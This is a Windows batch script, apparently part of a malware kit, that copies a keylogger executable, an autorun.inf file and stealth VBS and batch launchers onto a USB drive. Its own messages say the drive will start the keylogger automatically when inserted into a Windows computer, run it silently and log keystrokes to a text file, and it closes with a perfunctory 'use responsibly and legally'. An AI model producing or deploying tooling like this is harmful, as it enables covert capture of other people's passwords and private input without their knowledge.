@echo off
echo USB Keylogger Deployment Script
echo ==============================

echo.
echo This script will copy all necessary files to your USB drive.
echo Make sure your USB drive is inserted and ready.
echo.

set /p drive="Enter USB drive letter (e.g., E:): "

if not exist "%drive%\" (
    echo Error: Drive %drive% does not exist!
    echo Please check your USB drive letter and try again.
    pause
    exit /b 1
)

echo.
echo Copying files to %drive%...
copy "keylogger.exe" "%drive%\" >nul
copy "autorun.inf" "%drive%\" >nul
copy "stealth_autorun.vbs" "%drive%\" >nul
copy "usb_autorun.bat" "%drive%\" >nul
copy "README.txt" "%drive%\" >nul

echo.
echo Files copied successfully to %drive%!
echo.
echo Your USB keylogger is ready to use.
echo When inserted into a Windows computer, it will:
echo - Start automatically via autorun
echo - Run silently in the background
echo - Log keystrokes to keylog_output.txt
echo.
echo Remember to use responsibly and legally!
pause 